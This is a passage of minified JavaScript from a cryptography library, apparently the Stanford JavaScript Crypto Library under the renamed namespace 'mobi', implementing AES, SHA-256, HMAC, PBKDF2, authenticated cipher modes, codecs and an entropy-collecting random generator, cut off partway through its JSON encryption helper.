function q(a) {
    throw a;
}
var t = void 0,
    u = !1;
var mobi = {
    cipher: {},
    hash: {},
    keyexchange: {},
    mode: {},
    misc: {},
    codec: {},
    exception: {
        corrupt: function (a) {
            this.toString = function () {
                return "CORRUPT: " + this.message
            };
            this.message = a
        },
        invalid: function (a) {
            this.toString = function () {
                return "INVALID: " + this.message
            };
            this.message = a
        },
        bug: function (a) {
            this.toString = function () {
                return "BUG: " + this.message
            };
            this.message = a
        },
        notReady: function (a) {
            this.toString = function () {
                return "NOT READY: " + this.message
            };
            this.message = a
        }
    }
};
"undefined" !== typeof module && module.exports && (module.exports = mobi);
mobi.cipher.aes = function (a) {
    this.k[0][0][0] || this.D();
    var b, c, d, e, f = this.k[0][4],
        g = this.k[1];
    b = a.length;
    var h = 1;
    4 !== b && (6 !== b && 8 !== b) && q(new mobi.exception.invalid("invalid aes key size"));
    this.b = [d = a.slice(0), e = []];
    for (a = b; a < 4 * b + 28; a++) {
        c = d[a - 1];
        if (0 === a % b || 8 === b && 4 === a % b) c = f[c >>> 24] << 24 ^ f[c >> 16 & 255] << 16 ^ f[c >> 8 & 255] << 8 ^ f[c & 255], 0 === a % b && (c = c << 8 ^ c >>> 24 ^ h << 24, h = h << 1 ^ 283 * (h >> 7));
        d[a] = d[a - b] ^ c
    }
    for (b = 0; a; b++, a--) c = d[b & 3 ? a : a - 4], e[b] = 4 >= a || 4 > b ? c : g[0][f[c >>> 24]] ^ g[1][f[c >> 16 & 255]] ^ g[2][f[c >> 8 & 255]] ^ g[3][f[c &
        255]]
};
mobi.cipher.aes.prototype = {
    mobie: function (a) {
        return y(this, a, 0)
    },
    mobid: function (a) {
        return y(this, a, 1)
    },
    k: [
        [
            [],
            [],
            [],
            [],
            []
        ],
        [
            [],
            [],
            [],
            [],
            []
        ]
    ],
    D: function () {
        var a = this.k[0],
            b = this.k[1],
            c = a[4],
            d = b[4],
            e, f, g, h = [],
            l = [],
            k, n, m, p;
        for (e = 0; 0x100 > e; e++) l[(h[e] = e << 1 ^ 283 * (e >> 7)) ^ e] = e;
        for (f = g = 0; !c[f]; f ^= k || 1, g = l[g] || 1) {
            m = g ^ g << 1 ^ g << 2 ^ g << 3 ^ g << 4;
            m = m >> 8 ^ m & 255 ^ 99;
            c[f] = m;
            d[m] = f;
            n = h[e = h[k = h[f]]];
            p = 0x1010101 * n ^ 0x10001 * e ^ 0x101 * k ^ 0x1010100 * f;
            n = 0x101 * h[m] ^ 0x1010100 * m;
            for (e = 0; 4 > e; e++) a[e][f] = n = n << 24 ^ n >>> 8, b[e][m] = p = p << 24 ^ p >>> 8
        }
        for (e =
            0; 5 > e; e++) a[e] = a[e].slice(0), b[e] = b[e].slice(0)
    }
};

function y(a, b, c) {
    4 !== b.length && q(new mobi.exception.invalid("invalid aes block size"));
    var d = a.b[c],
        e = b[0] ^ d[0],
        f = b[c ? 3 : 1] ^ d[1],
        g = b[2] ^ d[2];
    b = b[c ? 1 : 3] ^ d[3];
    var h, l, k, n = d.length / 4 - 2,
        m, p = 4,
        s = [0, 0, 0, 0];
    h = a.k[c];
    a = h[0];
    var r = h[1],
        v = h[2],
        w = h[3],
        x = h[4];
    for (m = 0; m < n; m++) h = a[e >>> 24] ^ r[f >> 16 & 255] ^ v[g >> 8 & 255] ^ w[b & 255] ^ d[p], l = a[f >>> 24] ^ r[g >> 16 & 255] ^ v[b >> 8 & 255] ^ w[e & 255] ^ d[p + 1], k = a[g >>> 24] ^ r[b >> 16 & 255] ^ v[e >> 8 & 255] ^ w[f & 255] ^ d[p + 2], b = a[b >>> 24] ^ r[e >> 16 & 255] ^ v[f >> 8 & 255] ^ w[g & 255] ^ d[p + 3], p += 4, e = h, f = l, g = k;
    for (m = 0; 4 >
        m; m++) s[c ? 3 & -m : m] = x[e >>> 24] << 24 ^ x[f >> 16 & 255] << 16 ^ x[g >> 8 & 255] << 8 ^ x[b & 255] ^ d[p++], h = e, e = f, f = g, g = b, b = h;
    return s
}
mobi.bitArray = {
    bitSlice: function (a, b, c) {
        a = mobi.bitArray.P(a.slice(b / 32), 32 - (b & 31)).slice(1);
        return c === t ? a : mobi.bitArray.clamp(a, c - b)
    },
    extract: function (a, b, c) {
        var d = Math.floor(-b - c & 31);
        return ((b + c - 1 ^ b) & -32 ? a[b / 32 | 0] << 32 - d ^ a[b / 32 + 1 | 0] >>> d : a[b / 32 | 0] >>> d) & (1 << c) - 1
    },
    concat: function (a, b) {
        if (0 === a.length || 0 === b.length) return a.concat(b);
        var c = a[a.length - 1],
            d = mobi.bitArray.getPartial(c);
        return 32 === d ? a.concat(b) : mobi.bitArray.P(b, d, c | 0, a.slice(0, a.length - 1))
    },
    bitLength: function (a) {
        var b = a.length;
        return 0 ===
            b ? 0 : 32 * (b - 1) + mobi.bitArray.getPartial(a[b - 1])
    },
    clamp: function (a, b) {
        if (32 * a.length < b) return a;
        a = a.slice(0, Math.ceil(b / 32));
        var c = a.length;
        b &= 31;
        0 < c && b && (a[c - 1] = mobi.bitArray.partial(b, a[c - 1] & 2147483648 >> b - 1, 1));
        return a
    },
    partial: function (a, b, c) {
        return 32 === a ? b : (c ? b | 0 : b << 32 - a) + 0x10000000000 * a
    },
    getPartial: function (a) {
        return Math.round(a / 0x10000000000) || 32
    },
    equal: function (a, b) {
        if (mobi.bitArray.bitLength(a) !== mobi.bitArray.bitLength(b)) return u;
        var c = 0,
            d;
        for (d = 0; d < a.length; d++) c |= a[d] ^ b[d];
        return 0 ===
            c
    },
    P: function (a, b, c, d) {
        var e;
        e = 0;
        for (d === t && (d = []); 32 <= b; b -= 32) d.push(c), c = 0;
        if (0 === b) return d.concat(a);
        for (e = 0; e < a.length; e++) d.push(c | a[e] >>> b), c = a[e] << 32 - b;
        e = a.length ? a[a.length - 1] : 0;
        a = mobi.bitArray.getPartial(e);
        d.push(mobi.bitArray.partial(b + a & 31, 32 < b + a ? c : d.pop(), 1));
        return d
    },
    l: function (a, b) {
        return [a[0] ^ b[0], a[1] ^ b[1], a[2] ^ b[2], a[3] ^ b[3]]
    }
};
mobi.codec.utf8String = {
    fromBits: function (a) {
        var b = "",
            c = mobi.bitArray.bitLength(a),
            d, e;
        for (d = 0; d < c / 8; d++) 0 === (d & 3) && (e = a[d / 4]), b += String.fromCharCode(e >>> 24), e <<= 8;
        return decodeURIComponent(escape(b))
    },
    toBits: function (a) {
        a = unescape(encodeURIComponent(a));
        var b = [],
            c, d = 0;
        for (c = 0; c < a.length; c++) d = d << 8 | a.charCodeAt(c), 3 === (c & 3) && (b.push(d), d = 0);
        c & 3 && b.push(mobi.bitArray.partial(8 * (c & 3), d));
        return b
    }
};
mobi.codec.hex = {
    fromBits: function (a) {
        var b = "",
            c;
        for (c = 0; c < a.length; c++) b += ((a[c] | 0) + 0xf00000000000).toString(16).substr(4);
        return b.substr(0, mobi.bitArray.bitLength(a) / 4)
    },
    toBits: function (a) {
        var b, c = [],
            d;
        a = a.replace(/\s|0x/g, "");
        d = a.length;
        a += "00000000";
        for (b = 0; b < a.length; b += 8) c.push(parseInt(a.substr(b, 8), 16) ^ 0);
        return mobi.bitArray.clamp(c, 4 * d)
    }
};
mobi.codec.base64 = {
    J: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    fromBits: function (a, b, c) {
        var d = "",
            e = 0,
            f = mobi.codec.base64.J,
            g = 0,
            h = mobi.bitArray.bitLength(a);
        c && (f = f.substr(0, 62) + "-_");
        for (c = 0; 6 * d.length <= h;) d += f.charAt((g ^ a[c] >>> e) >>> 26), 6 > e ? (g = a[c] << 6 - e, e += 26, c++) : (g <<= 6, e -= 6);
        for (; d.length & 3 && !b;) d += "=";
        return d
    },
    toBits: function (a, b) {
        a = a.replace(/\s|=/g, "");
        var c = [],
            d, e = 0,
            f = mobi.codec.base64.J,
            g = 0,
            h;
        b && (f = f.substr(0, 62) + "-_");
        for (d = 0; d < a.length; d++) h = f.indexOf(a.charAt(d)),
            0 > h && q(new mobi.exception.invalid("this isn't base64!")), 26 < e ? (e -= 26, c.push(g ^ h >>> e), g = h << 32 - e) : (e += 6, g ^= h << 32 - e);
        e & 56 && c.push(mobi.bitArray.partial(e & 56, g, 1));
        return c
    }
};
mobi.codec.base64url = {
    fromBits: function (a) {
        return mobi.codec.base64.fromBits(a, 1, 1)
    },
    toBits: function (a) {
        return mobi.codec.base64.toBits(a, 1)
    }
};
mobi.hash.sha256 = function (a) {
    this.b[0] || this.D();
    a ? (this.r = a.r.slice(0), this.o = a.o.slice(0), this.h = a.h) : this.reset()
};
mobi.hash.sha256.hash = function (a) {
    return (new mobi.hash.sha256).update(a).finalize()
};
mobi.hash.sha256.prototype = {
    blockSize: 512,
    reset: function () {
        this.r = this.N.slice(0);
        this.o = [];
        this.h = 0;
        return this
    },
    update: function (a) {
        "string" === typeof a && (a = mobi.codec.utf8String.toBits(a));
        var b, c = this.o = mobi.bitArray.concat(this.o, a);
        b = this.h;
        a = this.h = b + mobi.bitArray.bitLength(a);
        for (b = 512 + b & -512; b <= a; b += 512) z(this, c.splice(0, 16));
        return this
    },
    finalize: function () {
        var a, b = this.o,
            c = this.r,
            b = mobi.bitArray.concat(b, [mobi.bitArray.partial(1, 1)]);
        for (a = b.length + 2; a & 15; a++) b.push(0);
        b.push(Math.floor(this.h /
            4294967296));
        for (b.push(this.h | 0); b.length;) z(this, b.splice(0, 16));
        this.reset();
        return c
    },
    N: [],
    b: [],
    D: function () {
        function a(a) {
            return 0x100000000 * (a - Math.floor(a)) | 0
        }
        var b = 0,
            c = 2,
            d;
        a: for (; 64 > b; c++) {
            for (d = 2; d * d <= c; d++)
                if (0 === c % d) continue a;
            8 > b && (this.N[b] = a(Math.pow(c, 0.5)));
            this.b[b] = a(Math.pow(c, 1 / 3));
            b++
        }
    }
};

function z(a, b) {
    var c, d, e, f = b.slice(0),
        g = a.r,
        h = a.b,
        l = g[0],
        k = g[1],
        n = g[2],
        m = g[3],
        p = g[4],
        s = g[5],
        r = g[6],
        v = g[7];
    for (c = 0; 64 > c; c++) 16 > c ? d = f[c] : (d = f[c + 1 & 15], e = f[c + 14 & 15], d = f[c & 15] = (d >>> 7 ^ d >>> 18 ^ d >>> 3 ^ d << 25 ^ d << 14) + (e >>> 17 ^ e >>> 19 ^ e >>> 10 ^ e << 15 ^ e << 13) + f[c & 15] + f[c + 9 & 15] | 0), d = d + v + (p >>> 6 ^ p >>> 11 ^ p >>> 25 ^ p << 26 ^ p << 21 ^ p << 7) + (r ^ p & (s ^ r)) + h[c], v = r, r = s, s = p, p = m + d | 0, m = n, n = k, k = l, l = d + (k & n ^ m & (k ^ n)) + (k >>> 2 ^ k >>> 13 ^ k >>> 22 ^ k << 30 ^ k << 19 ^ k << 10) | 0;
    g[0] = g[0] + l | 0;
    g[1] = g[1] + k | 0;
    g[2] = g[2] + n | 0;
    g[3] = g[3] + m | 0;
    g[4] = g[4] + p | 0;
    g[5] = g[5] + s | 0;
    g[6] =
        g[6] + r | 0;
    g[7] = g[7] + v | 0
}
mobi.mode.ccm = {
    name: "ccm",
    mobie: function (a, b, c, d, e) {
        var f, g = b.slice(0),
            h = mobi.bitArray,
            l = h.bitLength(c) / 8,
            k = h.bitLength(g) / 8;
        e = e || 64;
        d = d || [];
        7 > l && q(new mobi.exception.invalid("ccm: iv must be at least 7 bytes"));
        for (f = 2; 4 > f && k >>> 8 * f; f++);
        f < 15 - l && (f = 15 - l);
        c = h.clamp(c, 8 * (15 - f));
        b = mobi.mode.ccm.L(a, b, c, d, e, f);
        g = mobi.mode.ccm.p(a, g, c, b, e, f);
        return h.concat(g.data, g.tag)
    },
    mobid: function (a, b, c, d, e) {
        e = e || 64;
        d = d || [];
        var f = mobi.bitArray,
            g = f.bitLength(c) / 8,
            h = f.bitLength(b),
            l = f.clamp(b, h - e),
            k = f.bitSlice(b,
                h - e),
            h = (h - e) / 8;
        7 > g && q(new mobi.exception.invalid("ccm: iv must be at least 7 bytes"));
        for (b = 2; 4 > b && h >>> 8 * b; b++);
        b < 15 - g && (b = 15 - g);
        c = f.clamp(c, 8 * (15 - b));
        l = mobi.mode.ccm.p(a, l, c, k, e, b);
        a = mobi.mode.ccm.L(a, l.data, c, d, e, b);
        f.equal(l.tag, a) || q(new mobi.exception.corrupt("ccm: tag doesn't match"));
        return l.data
    },
    L: function (a, b, c, d, e, f) {
        var g = [],
            h = mobi.bitArray,
            l = h.l;
        e /= 8;
        (e % 2 || 4 > e || 16 < e) && q(new mobi.exception.invalid("ccm: invalid tag length"));
        (0xffffffff < d.length || 0xffffffff < b.length) && q(new mobi.exception.bug("ccm: can't deal with 4GiB or more data"));
        f = [h.partial(8, (d.length ? 64 : 0) | e - 2 << 2 | f - 1)];
        f = h.concat(f, c);
        f[3] |= h.bitLength(b) / 8;
        f = a.mobie(f);
        if (d.length) {
            c = h.bitLength(d) / 8;
            65279 >= c ? g = [h.partial(16, c)] : 0xffffffff >= c && (g = h.concat([h.partial(16, 65534)], [c]));
            g = h.concat(g, d);
            for (d = 0; d < g.length; d += 4) f = a.mobie(l(f, g.slice(d, d + 4).concat([0, 0, 0])))
        }
        for (d = 0; d < b.length; d += 4) f = a.mobie(l(f, b.slice(d, d + 4).concat([0, 0, 0])));
        return h.clamp(f, 8 * e)
    },
    p: function (a, b, c, d, e, f) {
        var g, h = mobi.bitArray;
        g = h.l;
        var l = b.length,
            k = h.bitLength(b);
        c = h.concat([h.partial(8,
            f - 1)], c).concat([0, 0, 0]).slice(0, 4);
        d = h.bitSlice(g(d, a.mobie(c)), 0, e);
        if (!l) return {
            tag: d,
            data: []
        };
        for (g = 0; g < l; g += 4) c[3]++, e = a.mobie(c), b[g] ^= e[0], b[g + 1] ^= e[1], b[g + 2] ^= e[2], b[g + 3] ^= e[3];
        return {
            tag: d,
            data: h.clamp(b, k)
        }
    }
};
mobi.mode.ocb2 = {
    name: "ocb2",
    mobie: function (a, b, c, d, e, f) {
        128 !== mobi.bitArray.bitLength(c) && q(new mobi.exception.invalid("ocb iv must be 128 bits"));
        var g, h = mobi.mode.ocb2.H,
            l = mobi.bitArray,
            k = l.l,
            n = [0, 0, 0, 0];
        c = h(a.mobie(c));
        var m, p = [];
        d = d || [];
        e = e || 64;
        for (g = 0; g + 4 < b.length; g += 4) m = b.slice(g, g + 4), n = k(n, m), p = p.concat(k(c, a.mobie(k(c, m)))), c = h(c);
        m = b.slice(g);
        b = l.bitLength(m);
        g = a.mobie(k(c, [0, 0, 0, b]));
        m = l.clamp(k(m.concat([0, 0, 0]), g), b);
        n = k(n, k(m.concat([0, 0, 0]), g));
        n = a.mobie(k(n, k(c, h(c))));
        d.length &&
            (n = k(n, f ? d : mobi.mode.ocb2.pmac(a, d)));
        return p.concat(l.concat(m, l.clamp(n, e)))
    },
    mobid: function (a, b, c, d, e, f) {
        128 !== mobi.bitArray.bitLength(c) && q(new mobi.exception.invalid("ocb iv must be 128 bits"));
        e = e || 64;
        var g = mobi.mode.ocb2.H,
            h = mobi.bitArray,
            l = h.l,
            k = [0, 0, 0, 0],
            n = g(a.mobie(c)),
            m, p, s = mobi.bitArray.bitLength(b) - e,
            r = [];
        d = d || [];
        for (c = 0; c + 4 < s / 32; c += 4) m = l(n, a.mobid(l(n, b.slice(c, c + 4)))), k = l(k, m), r = r.concat(m), n = g(n);
        p = s - 32 * c;
        m = a.mobie(l(n, [0, 0, 0, p]));
        m = l(m, h.clamp(b.slice(c), p).concat([0, 0, 0]));
        k = l(k, m);
        k = a.mobie(l(k, l(n, g(n))));
        d.length && (k = l(k, f ? d : mobi.mode.ocb2.pmac(a, d)));
        h.equal(h.clamp(k, e), h.bitSlice(b, s)) || q(new mobi.exception.corrupt("ocb: tag doesn't match"));
        return r.concat(h.clamp(m, p))
    },
    pmac: function (a, b) {
        var c, d = mobi.mode.ocb2.H,
            e = mobi.bitArray,
            f = e.l,
            g = [0, 0, 0, 0],
            h = a.mobie([0, 0, 0, 0]),
            h = f(h, d(d(h)));
        for (c = 0; c + 4 < b.length; c += 4) h = d(h), g = f(g, a.mobie(f(h, b.slice(c, c + 4))));
        c = b.slice(c);
        128 > e.bitLength(c) && (h = f(h, d(h)), c = e.concat(c, [-2147483648, 0, 0, 0]));
        g = f(g, c);
        return a.mobie(f(d(f(h,
            d(h))), g))
    },
    H: function (a) {
        return [a[0] << 1 ^ a[1] >>> 31, a[1] << 1 ^ a[2] >>> 31, a[2] << 1 ^ a[3] >>> 31, a[3] << 1 ^ 135 * (a[0] >>> 31)]
    }
};
mobi.mode.gcm = {
    name: "gcm",
    mobie: function (a, b, c, d, e) {
        var f = b.slice(0);
        b = mobi.bitArray;
        d = d || [];
        a = mobi.mode.gcm.p(!0, a, f, d, c, e || 128);
        return b.concat(a.data, a.tag)
    },
    mobid: function (a, b, c, d, e) {
        var f = b.slice(0),
            g = mobi.bitArray,
            h = g.bitLength(f);
        e = e || 128;
        d = d || [];
        e <= h ? (b = g.bitSlice(f, h - e), f = g.bitSlice(f, 0, h - e)) : (b = f, f = []);
        a = mobi.mode.gcm.p(u, a, f, d, c, e);
        g.equal(a.tag, b) || q(new mobi.exception.corrupt("gcm: tag doesn't match"));
        return a.data
    },
    Z: function (a, b) {
        var c, d, e, f, g, h = mobi.bitArray.l;
        e = [0, 0, 0, 0];
        f = b.slice(0);
        for (c = 0; 128 > c; c++) {
            (d = 0 !== (a[Math.floor(c / 32)] & 1 << 31 - c % 32)) && (e = h(e, f));
            g = 0 !== (f[3] & 1);
            for (d = 3; 0 < d; d--) f[d] = f[d] >>> 1 | (f[d - 1] & 1) << 31;
            f[0] >>>= 1;
            g && (f[0] ^= -0x1f000000)
        }
        return e
    },
    g: function (a, b, c) {
        var d, e = c.length;
        b = b.slice(0);
        for (d = 0; d < e; d += 4) b[0] ^= 0xffffffff & c[d], b[1] ^= 0xffffffff & c[d + 1], b[2] ^= 0xffffffff & c[d + 2], b[3] ^= 0xffffffff & c[d + 3], b = mobi.mode.gcm.Z(b, a);
        return b
    },
    p: function (a, b, c, d, e, f) {
        var g, h, l, k, n, m, p, s, r = mobi.bitArray;
        m = c.length;
        p = r.bitLength(c);
        s = r.bitLength(d);
        h = r.bitLength(e);
        g = b.mobie([0,
            0, 0, 0
        ]);
        96 === h ? (e = e.slice(0), e = r.concat(e, [1])) : (e = mobi.mode.gcm.g(g, [0, 0, 0, 0], e), e = mobi.mode.gcm.g(g, e, [0, 0, Math.floor(h / 0x100000000), h & 0xffffffff]));
        h = mobi.mode.gcm.g(g, [0, 0, 0, 0], d);
        n = e.slice(0);
        d = h.slice(0);
        a || (d = mobi.mode.gcm.g(g, h, c));
        for (k = 0; k < m; k += 4) n[3]++, l = b.mobie(n), c[k] ^= l[0], c[k + 1] ^= l[1], c[k + 2] ^= l[2], c[k + 3] ^= l[3];
        c = r.clamp(c, p);
        a && (d = mobi.mode.gcm.g(g, h, c));
        a = [Math.floor(s / 0x100000000), s & 0xffffffff, Math.floor(p / 0x100000000), p & 0xffffffff];
        d = mobi.mode.gcm.g(g, d, a);
        l = b.mobie(e);
        d[0] ^= l[0];
        d[1] ^= l[1];
        d[2] ^= l[2];
        d[3] ^= l[3];
        return {
            tag: r.bitSlice(d, 0, f),
            data: c
        }
    }
};
mobi.misc.hmac = function (a, b) {
    this.M = b = b || mobi.hash.sha256;
    var c = [
            [],
            []
        ],
        d, e = b.prototype.blockSize / 32;
    this.n = [new b, new b];
    a.length > e && (a = b.hash(a));
    for (d = 0; d < e; d++) c[0][d] = a[d] ^ 909522486, c[1][d] = a[d] ^ 1549556828;
    this.n[0].update(c[0]);
    this.n[1].update(c[1]);
    this.G = new b(this.n[0])
};
mobi.misc.hmac.prototype.mobie = mobi.misc.hmac.prototype.mac = function (a) {
    this.Q && q(new mobi.exception.invalid("mobie on already updated hmac called!"));
    this.update(a);
    return this.digest(a)
};
mobi.misc.hmac.prototype.reset = function () {
    this.G = new this.M(this.n[0]);
    this.Q = u
};
mobi.misc.hmac.prototype.update = function (a) {
    this.Q = !0;
    this.G.update(a)
};
mobi.misc.hmac.prototype.digest = function () {
    var a = this.G.finalize(),
        a = (new this.M(this.n[1])).update(a).finalize();
    this.reset();
    return a
};
mobi.misc.pbkdf2 = function (a, b, c, d, e) {
    c = c || 1E3;
    (0 > d || 0 > c) && q(mobi.exception.invalid("invalid params to pbkdf2"));
    "string" === typeof a && (a = mobi.codec.utf8String.toBits(a));
    "string" === typeof b && (b = mobi.codec.utf8String.toBits(b));
    e = e || mobi.misc.hmac;
    a = new e(a);
    var f, g, h, l, k = [],
        n = mobi.bitArray;
    for (l = 1; 32 * k.length < (d || 1); l++) {
        e = f = a.mobie(n.concat(b, [l]));
        for (g = 1; g < c; g++) {
            f = a.mobie(f);
            for (h = 0; h < f.length; h++) e[h] ^= f[h]
        }
        k = k.concat(e)
    }
    d && (k = n.clamp(k, d));
    return k
};
mobi.prng = function (a) {
    this.c = [new mobi.hash.sha256];
    this.i = [0];
    this.F = 0;
    this.s = {};
    this.C = 0;
    this.K = {};
    this.O = this.d = this.j = this.W = 0;
    this.b = [0, 0, 0, 0, 0, 0, 0, 0];
    this.f = [0, 0, 0, 0];
    this.A = t;
    this.B = a;
    this.q = u;
    this.w = {
        progress: {},
        seeded: {}
    };
    this.m = this.V = 0;
    this.t = 1;
    this.u = 2;
    this.S = 0x10000;
    this.I = [0, 48, 64, 96, 128, 192, 0x100, 384, 512, 768, 1024];
    this.T = 3E4;
    this.R = 80
};
mobi.prng.prototype = {
    randomWords: function (a, b) {
        var c = [],
            d;
        d = this.isReady(b);
        var e;
        d === this.m && q(new mobi.exception.notReady("generator isn't seeded"));
        if (d & this.u) {
            d = !(d & this.t);
            e = [];
            var f = 0,
                g;
            this.O = e[0] = (new Date).valueOf() + this.T;
            for (g = 0; 16 > g; g++) e.push(0x100000000 * Math.random() | 0);
            for (g = 0; g < this.c.length && !(e = e.concat(this.c[g].finalize()), f += this.i[g], this.i[g] = 0, !d && this.F & 1 << g); g++);
            this.F >= 1 << this.c.length && (this.c.push(new mobi.hash.sha256), this.i.push(0));
            this.d -= f;
            f > this.j && (this.j = f);
            this.F++;
            this.b = mobi.hash.sha256.hash(this.b.concat(e));
            this.A = new mobi.cipher.aes(this.b);
            for (d = 0; 4 > d && !(this.f[d] = this.f[d] + 1 | 0, this.f[d]); d++);
        }
        for (d = 0; d < a; d += 4) 0 === (d + 1) % this.S && A(this), e = B(this), c.push(e[0], e[1], e[2], e[3]);
        A(this);
        return c.slice(0, a)
    },
    setDefaultParanoia: function (a, b) {
        0 === a && "Setting paranoia=0 will ruin your security; use it only for testing" !== b && q("Setting paranoia=0 will ruin your security; use it only for testing");
        this.B = a
    },
    addEntropy: function (a, b, c) {
        c = c || "user";
        var d, e, f = (new Date).valueOf(),
            g = this.s[c],
            h = this.isReady(),
            l = 0;
        d = this.K[c];
        d === t && (d = this.K[c] = this.W++);
        g === t && (g = this.s[c] = 0);
        this.s[c] = (this.s[c] + 1) % this.c.length;
        switch (typeof a) {
        case "number":
            b === t && (b = 1);
            this.c[g].update([d, this.C++, 1, b, f, 1, a | 0]);
            break;
        case "object":
            c = Object.prototype.toString.call(a);
            if ("[object Uint32Array]" === c) {
                e = [];
                for (c = 0; c < a.length; c++) e.push(a[c]);
                a = e
            } else {
                "[object Array]" !== c && (l = 1);
                for (c = 0; c < a.length && !l; c++) "number" !== typeof a[c] && (l = 1)
            } if (!l) {
                if (b === t)
                    for (c = b = 0; c < a.length; c++)
                        for (e = a[c]; 0 < e;) b++,
                            e >>>= 1;
                this.c[g].update([d, this.C++, 2, b, f, a.length].concat(a))
            }
            break;
        case "string":
            b === t && (b = a.length);
            this.c[g].update([d, this.C++, 3, b, f, a.length]);
            this.c[g].update(a);
            break;
        default:
            l = 1
        }
        l && q(new mobi.exception.bug("random: addEntropy only supports number, array of numbers or string"));
        this.i[g] += b;
        this.d += b;
        h === this.m && (this.isReady() !== this.m && C("seeded", Math.max(this.j, this.d)), C("progress", this.getProgress()))
    },
    isReady: function (a) {
        a = this.I[a !== t ? a : this.B];
        return this.j && this.j >= a ? this.i[0] > this.R &&
            (new Date).valueOf() > this.O ? this.u | this.t : this.t : this.d >= a ? this.u | this.m : this.m
    },
    getProgress: function (a) {
        a = this.I[a ? a : this.B];
        return this.j >= a ? 1 : this.d > a ? 1 : this.d / a
    },
    startCollectors: function () {
        this.q || (this.a = {
            loadTimeCollector: D(this, this.aa),
            mouseCollector: D(this, this.ba),
            keyboardCollector: D(this, this.$),
            accelerometerCollector: D(this, this.U)
        }, window.addEventListener ? (window.addEventListener("load", this.a.loadTimeCollector, u), window.addEventListener("mousemove", this.a.mouseCollector, u), window.addEventListener("keypress",
            this.a.keyboardCollector, u), window.addEventListener("devicemotion", this.a.accelerometerCollector, u)) : document.attachEvent ? (document.attachEvent("onload", this.a.loadTimeCollector), document.attachEvent("onmousemove", this.a.mouseCollector), document.attachEvent("keypress", this.a.keyboardCollector)) : q(new mobi.exception.bug("can't attach event")), this.q = !0)
    },
    stopCollectors: function () {
        this.q && (window.removeEventListener ? (window.removeEventListener("load", this.a.loadTimeCollector, u), window.removeEventListener("mousemove",
            this.a.mouseCollector, u), window.removeEventListener("keypress", this.a.keyboardCollector, u), window.removeEventListener("devicemotion", this.a.accelerometerCollector, u)) : document.detachEvent && (document.detachEvent("onload", this.a.loadTimeCollector), document.detachEvent("onmousemove", this.a.mouseCollector), document.detachEvent("keypress", this.a.keyboardCollector)), this.q = u)
    },
    addEventListener: function (a, b) {
        this.w[a][this.V++] = b
    },
    removeEventListener: function (a, b) {
        var c, d, e = this.w[a],
            f = [];
        for (d in e) e.hasOwnProperty(d) &&
            e[d] === b && f.push(d);
        for (c = 0; c < f.length; c++) d = f[c], delete e[d]
    },
    $: function () {
        E(1)
    },
    ba: function (a) {
        mobi.random.addEntropy([a.x || a.clientX || a.offsetX || 0, a.y || a.clientY || a.offsetY || 0], 2, "mouse");
        E(0)
    },
    aa: function () {
        E(2)
    },
    U: function (a) {
        a = a.accelerationIncludingGravity.x || a.accelerationIncludingGravity.y || a.accelerationIncludingGravity.z;
        if (window.orientation) {
            var b = window.orientation;
            "number" === typeof b && mobi.random.addEntropy(b, 1, "accelerometer")
        }
        a && mobi.random.addEntropy(a, 2, "accelerometer");
        E(0)
    }
};

function C(a, b) {
    var c, d = mobi.random.w[a],
        e = [];
    for (c in d) d.hasOwnProperty(c) && e.push(d[c]);
    for (c = 0; c < e.length; c++) e[c](b)
}

function E(a) {
    window && window.performance && "function" === typeof window.performance.now ? mobi.random.addEntropy(window.performance.now(), a, "loadtime") : mobi.random.addEntropy((new Date).valueOf(), a, "loadtime")
}

function A(a) {
    a.b = B(a).concat(B(a));
    a.A = new mobi.cipher.aes(a.b)
}

function B(a) {
    for (var b = 0; 4 > b && !(a.f[b] = a.f[b] + 1 | 0, a.f[b]); b++);
    return a.A.mobie(a.f)
}

function D(a, b) {
    return function () {
        b.apply(a, arguments)
    }
}
mobi.random = new mobi.prng(6);
a: try {
    var F, G, H, I;
    if (I = "undefined" !== typeof module) {
        var J;
        if (J = module.exports) {
            var K;
            try {
                K = require("crypto")
            } catch (L) {
                K = null
            }
            J = (G = K) && G.randomBytes
        }
        I = J
    }
    if (I) F = G.randomBytes(128), F = new Uint32Array((new Uint8Array(F)).buffer), mobi.random.addEntropy(F, 1024, "crypto['randomBytes']");
    else if (window && Uint32Array) {
        H = new Uint32Array(32);
        if (window.crypto && window.crypto.getRandomValues) window.crypto.getRandomValues(H);
        else if (window.msCrypto && window.msCrypto.getRandomValues) window.msCrypto.getRandomValues(H);
        else break a;
        mobi.random.addEntropy(H, 1024, "crypto['getRandomValues']")
    }
} catch (M) {
    "undefined" !== typeof window && window.console && (console.log("There was an error collecting entropy from the browser:"), console.log(M))
}


mobi.json = {
    defaults: {
        v: 1,
        iter: 1E3,
        ks: 128,
        ts: 64,
        mode: "ccm",
        adata: "",
        cipher: "aes"
    },
    Y: function (a, b, c, d) {
        c = c || {};
        d = d || {};
        var e = mobi.json,
            f = e.e({
                iv: mobi.random.randomWords(4, 0)
            }, e.defaults),
            g;
        e.e(f, c);
        c = f.adata;
        "string" === typeof f.salt && (f.salt = mobi.codec.base64.toBits(f.salt));
        "string" === typeof f.iv && (f.iv = mobi.codec.base64.toBits(f.iv));
        (!mobi.mode[f.mode] || !mobi.cipher[f.cipher] || "string" === typeof a && 100 >= f.iter || 64 !== f.ts && 96 !== f.ts && 128 !== f.ts || 128 !== f.ks && 192 !== f.ks && 0x100 !== f.ks || 2 > f.iv.length || 4 <
            f.iv.length) && q(new mobi.exception.invalid("json mobie: invalid parameters"));
        "string" === typeof a ? (g = mobi.misc.cachedPbkdf2(a, f), a = g.key.slice(0, f.ks / 32), f.salt = g.salt) : mobi.ecc && a instanceof mobi.ecc.elGamal.publicKey && (g = a.kem(), f.kemtag = g.tag, a = g.key.slice(0, f.ks / 32));
        "string" === typeof b && (b = mobi.codec.utf8String.toBits(b));
        "string" === typeof c && (c = mobi.codec.utf8String.toBits(c));
        g = new mobi.cipher[f.cipher](a);
        e.e(d, f);
        d.key = a;
        f.ct = mobi.mode[f.mode].mobie(g, b, f.iv, c, f.ts);
        return f
    },
    mobie: function (a,
        b, c, d) {
        var e = mobi.json,
            f = e.Y.apply(e, arguments);
        return e.encode(f)
    },
    X: function (a, b, c, d) {
        c = c || {};
        d = d || {};
        var e = mobi.json;
        b = e.e(e.e(e.e({}, e.defaults), b), c, !0);
        var f;
        c = b.adata;
        "string" === typeof b.salt && (b.salt = mobi.codec.base64.toBits(b.salt));
        "string" === typeof b.iv && (b.iv = mobi.codec.base64.toBits(b.iv));
